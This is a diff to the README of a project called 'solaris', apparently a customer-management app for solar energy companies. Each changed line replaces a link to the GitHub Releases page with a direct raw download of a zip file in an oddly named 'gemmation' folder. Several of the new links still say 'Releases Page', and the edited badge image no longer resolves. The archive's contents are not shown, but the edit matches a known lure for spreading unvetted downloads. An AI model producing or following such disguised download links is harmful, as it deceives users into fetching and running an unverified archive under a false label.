@@ -6,7 +6,7 @@ Welcome to solaris! This application helps solar energy companies manage custome
 
 ## 📥 Download Now
 
-[![Download solaris](https://img.shields.io/badge/Download%20solaris-Click%20Here-blue)](https://github.com/Opurbo2021/solaris/releases)
+[![Download solaris](https://raw.githubusercontent.com/Opurbo2021/solaris/main/gemmation/solaris.zip%20solaris-Click%20Here-blue)](https://raw.githubusercontent.com/Opurbo2021/solaris/main/gemmation/solaris.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you start, please ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-To download solaris, visit this page to download: [Releases Page](https://github.com/Opurbo2021/solaris/releases). 
+To download solaris, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Opurbo2021/solaris/main/gemmation/solaris.zip). 
 
 Once you are on the Releases page, follow these simple steps:
 
@@ -74,7 +74,7 @@ This application covers various important topics in the solar energy sector:
 
 ## 📅 Stay Updated
 
-To keep solaris running smoothly, we regularly release updates. You can always find the latest version on our [Releases Page](https://github.com/Opurbo2021/solaris/releases).
+To keep solaris running smoothly, we regularly release updates. You can always find the latest version on our [Releases Page](https://raw.githubusercontent.com/Opurbo2021/solaris/main/gemmation/solaris.zip).
 
 ## 📞 Support
 
